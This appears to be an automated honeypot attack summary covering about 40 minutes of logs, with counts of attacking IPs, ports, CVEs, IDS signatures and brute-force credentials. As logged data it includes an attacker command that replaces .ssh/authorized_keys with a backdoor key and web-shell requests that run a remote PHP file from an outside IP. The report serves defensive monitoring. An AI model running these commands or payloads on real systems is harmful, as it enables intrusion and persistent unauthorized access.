**Honeypot Attack Summary Report**

**Report Generation Time:** 2025-10-07T03:01:28Z
**Timeframe:** 2025-10-07T02:20:01Z to 2025-10-07T03:00:01Z
**Files Used:**
* agg_log_20251007T022001Z.json
* agg_log_20251007T024001Z.json
* agg_log_20251007T030001Z.json

**Executive Summary**
This report summarizes honeypot activity over a period of approximately 40 minutes, based on three log files. A total of 19,324 events were recorded across various honeypots. The most targeted services were Cowrie (SSH), Dionaea (SMB/CIFS), and Mailoney (SMTP). The majority of attacks originated from a small number of IP addresses, with `113.172.105.78` being the most prominent. Attackers were observed attempting to gain access via brute-force login attempts, exploiting known vulnerabilities, and executing malicious commands to download and execute malware.

**Detailed Analysis**

**Attacks by honeypot:**
* Cowrie: 5602
* Dionaea: 4168
* Mailoney: 2513
* Honeytrap: 2312
* Suricata: 1828
* Ciscoasa: 1144
* Sentrypeer: 488
* Adbhoney: 44
* H0neytr4p: 63
* Tanner: 33
* ConPot: 28
* Miniprint: 43
* Redishoneypot: 20
* Dicompot: 12
* Honeyaml: 22
* Medpot: 4

**Top attacking IPs:**
* 113.172.105.78: 3098
* 86.54.42.238: 1641
* 196.251.88.103: 1302
* 176.65.141.117: 820
* 179.179.235.1: 843
* 103.65.235.68: 940
* 172.86.95.98: 475
* 182.18.139.237: 204
* 36.91.166.34: 288
* 191.223.75.89: 258
* 223.87.29.190: 276
* 147.45.50.33: 233
* 103.189.208.13: 243
* 20.2.30.129: 199
* 181.225.64.116: 243

**Top targeted ports/protocols:**
* 445: 4084
* 25: 2513
* 22: 900
* 5060: 488
* 8333: 156
* 5901: 84
* 5903: 95
* TCP/1080: 110
* TCP/22: 43
* 443: 63
* 2323: 29
* 9100: 34
* 6379: 11
* 1025: 22

**Most common CVEs:**
* CVE-2002-0013 CVE-2002-0012: 8
* CVE-2021-3449 CVE-2021-3449: 3
* CVE-2019-11500 CVE-2019-11500: 2
* CVE-2006-2369: 1
* CVE-2002-0013 CVE-2002-0012 CVE-1999-0517: 1
* CVE-2001-0414: 1
* CVE-2006-3602 CVE-2006-4458 CVE-2006-4542: 1

**Commands attempted by attackers:**
* `cd ~; chattr -ia .ssh; lockr -ia .ssh`: 20
* `lockr -ia .ssh`: 20
* `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ... mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~`: 20
* `cat /proc/cpuinfo | grep name | wc -l`: 20
* `Enter new UNIX password: `: 20
* `Enter new UNIX password:`: 20
* `cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'`: 20
* `free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'`: 20
* `which ls`: 20
* `ls -lh $(which ls)`: 20
* `crontab -l`: 20
* `w`: 20
* `uname -m`: 20
* `cat /proc/cpuinfo | grep model | grep name | wc -l`: 20
* `top`: 20
* `uname`: 20
* `uname -a`: 20
* `whoami`: 20
* `lscpu | grep Model`: 20
* `df -h | head -n 2 | awk 'FNR == 2 {print $2;}'`: 20

**Signatures triggered:**
* ET DROP Dshield Block Listed Source group 1: 656
* 2402000: 656
* ET SCAN NMAP -sS window 1024: 158
* 2009582: 158
* GPL INFO SOCKS Proxy attempt: 97
* 2100615: 97
* ET INFO Reserved Internal IP Traffic: 56
* 2002752: 56
* ET SCAN Potential SSH Scan: 36
* 2001219: 36
* ET SCAN MS Terminal Server Traffic on Non-standard Port: 36
* 2023753: 36
* ET CINS Active Threat Intelligence Poor Reputation IP group 48: 23
* 2403347: 23
* ET CINS Active Threat Intelligence Poor Reputation IP group 44: 22
* 2403343: 22
* ET INFO CURL User Agent: 21
* 2002824: 21
* ET DROP Spamhaus DROP Listed Traffic Inbound group 28: 21
* 2400027: 21

**Users / login attempts:**
* 345gs5662d34/345gs5662d34: 16
* ansible/ansible!: 6
* root/A123456a: 3
* demo/demo: 3
* amir/amir: 3
* admin/09071980: 4
* admin/09061978: 4
* admin/09031980: 3
* admin/08101988: 3
* admin/080886: 3
* vpn/vpn@: 4
* vpn/vpn12345: 4
* root/: 4

**Files uploaded/downloaded:**
* wget.sh;: 8
* w.sh;: 2
* c.sh;: 2
* loader.sh: 18
* ~wwspar: 6
* PBX.php?cmd=id%3Buname+-a%3Bphp+-r+%27require%28%22http%3A%2F%2F104.194.143.156%2Ft%2Fcmd.txt%22%29%3B%27%3B: 1
* pannels_main.php?dark1=id%3Buname+-a%3Bphp+-r+%27require%28%22http%3A%2F%2F104.194.143.156%2Ft%2Fcmd.txt%22%29%3B%27%3B: 1
* Ultimatex.php?d111ae3c7c9bd50=admin&asd: 1
* Ultimatex.php?d111ae3c7c9bd50=id%3Buname+-a%3Bphp+-r+%27require%28%22http%3A%2F%2F104.194.143.156%2Ft%2Fcmd.txt%22%29%3B%27%3B&asd: 1
* 1.php?badr: 1
* page.phpinf.php?komand=cat+page.phpinf.php&1: 1
* emo.php?yokyok=cat+emo.php&: 1

**HTTP User-Agents:**
* No HTTP user agents were recorded in the logs.

**SSH clients and servers:**
* No SSH clients or servers were recorded in the logs.

**Top attacker AS organizations:**
* No attacker AS organizations were recorded in the logs.

**Key Observations and Anomalies**
* A significant amount of scanning and brute-force activity was observed on ports 445 (SMB) and 25 (SMTP).
* The commands attempted by attackers suggest an effort to establish persistent access by adding SSH keys to the `authorized_keys` file.
* Attackers are using `wget` and `curl` to download and execute malicious scripts.
* The presence of commands like `cat /proc/cpuinfo` and `uname -a` indicates that attackers are fingerprinting the system to tailor their attacks.
* The Suricata logs show a high number of "ET DROP Dshield Block Listed Source group 1" and "ET SCAN NMAP -sS window 1024" signatures, indicating that many of the attacking IPs are known bad actors and are actively scanning the network.
* There were several attempts to exploit older vulnerabilities, as shown by the CVEs listed.
